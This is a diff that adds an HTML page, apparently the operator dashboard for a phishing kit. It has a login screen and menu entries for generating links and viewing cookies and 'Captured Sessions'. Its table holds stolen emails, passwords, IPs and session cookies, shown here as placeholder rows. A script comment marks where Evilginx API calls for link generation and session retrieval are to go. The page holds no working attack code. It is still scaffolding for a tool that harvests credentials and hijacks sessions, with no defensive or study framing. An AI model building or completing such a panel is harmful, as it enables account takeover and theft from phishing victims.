@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard Panel</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .login-bg {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .dashboard-bg {
+            background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
+        }
+        .menu-button {
+            transition: transform 0.2s;
+        }
+        .menu-button:hover {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body class="bg-gray-100 h-screen">
+    <!-- Login Page -->
+    <div id="login-page" class="h-screen flex items-center justify-center login-bg">
+        <div class="bg-white p-6 rounded-xl shadow-md w-96">
+            <h2 class="text-3xl font-extrabold text-center mb-6 text-gray-800">Login</h2>
+            <form id="login-form" action="dashboard.html">
+                <div class="mb-4">
+                    <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
+                    <input type="text" id="username" name="username" class="w-full p-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500" required>
+                </div>
+                <div class="mb-6">
+                    <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
+                    <input type="password" id="password" name="password" class="w-full p-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500" required>
+                </div>
+                <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-md text-lg font-semibold hover:bg-blue-700 transition duration-300">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard" class="hidden dashboard-bg">
+        <div class="flex h-screen">
+            <!-- Sidebar -->
+            <aside class="w-64 bg-gray-900 text-white flex flex-col">
+                <div class="p-6 text-center font-bold text-2xl border-b border-gray-700">Dashboard</div>
+                <nav class="flex-grow">
+                    <a href="#" class="menu-button block px-6 py-3 hover:bg-gray-700 text-lg">Generate Link</a>
+                    <a href="#" class="menu-button block px-6 py-3 hover:bg-gray-700 text-lg">Drakotech</a>
+                    <a href="#" class="menu-button block px-6 py-3 hover:bg-gray-700 text-lg">Cookies</a>
+                    <a href="#" class="menu-button block px-6 py-3 hover:bg-gray-700 text-lg">Captured Sessions</a>
+                    <a href="index.html" class="menu-button block px-6 py-3 hover:bg-gray-700 text-lg">Logout</a>
+                </nav>
+            </aside>
+
+            <!-- Main Content -->
+            <main class="flex-grow p-8">
+                <div class="grid grid-cols-1 gap-8">
+                    <!-- First Section -->
+                    <section class="bg-white rounded-xl shadow-lg p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Captured Sessions</h3>
+                        <div class="rounded-lg border border-gray-300 p-4">
+                            <table class="w-full border-collapse border border-gray-300 text-left">
+                                <thead class="bg-gray-200">
+                                    <tr>
+                                        <th class="border border-gray-300 px-4 py-2">Email</th>
+                                        <th class="border border-gray-300 px-4 py-2">Password</th>
+                                        <th class="border border-gray-300 px-4 py-2">IP</th>
+                                        <th class="border border-gray-300 px-4 py-2">Location</th>
+                                        <th class="border border-gray-300 px-4 py-2">Cookies</th>
+                                        <th class="border border-gray-300 px-4 py-2">Timestamp</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td class="border border-gray-300 px-4 py-2">example@example.com</td>
+                                        <td class="border border-gray-300 px-4 py-2">password123</td>
+                                        <td class="border border-gray-300 px-4 py-2">192.168.1.1</td>
+                                        <td class="border border-gray-300 px-4 py-2">New York, USA</td>
+                                        <td class="border border-gray-300 px-4 py-2">session=abc123</td>
+                                        <td class="border border-gray-300 px-4 py-2">2025-01-27 14:00</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </section>
+
+                    <!-- Second Section -->
+                    <section class="bg-white rounded-xl shadow-lg p-6">
+                        <h3 class="text-2xl font-semibold mb-4">Access History</h3>
+                        <div class="rounded-lg border border-gray-300 p-4">
+                            <table class="w-full border-collapse border border-gray-300 text-left">
+                                <thead class="bg-gray-200">
+                                    <tr>
+                                        <th class="border border-gray-300 px-4 py-2">IP</th>
+                                        <th class="border border-gray-300 px-4 py-2">Location</th>
+                                        <th class="border border-gray-300 px-4 py-2">Timestamp</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td class="border border-gray-300 px-4 py-2">192.168.1.1</td>
+                                        <td class="border border-gray-300 px-4 py-2">New York, USA</td>
+                                        <td class="border border-gray-300 px-4 py-2">2025-01-27 14:00</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </section>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script>
+        // Redirect from login to dashboard
+        const loginForm = document.getElementById('login-form');
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            window.location.href = 'dashboard.html';
+        });
+
+        // Placeholder for Evilginx API integration
+        // Use fetch or Axios to call Evilginx API endpoints for link generation and session data retrieval
+    </script>
+</body>
+</html>
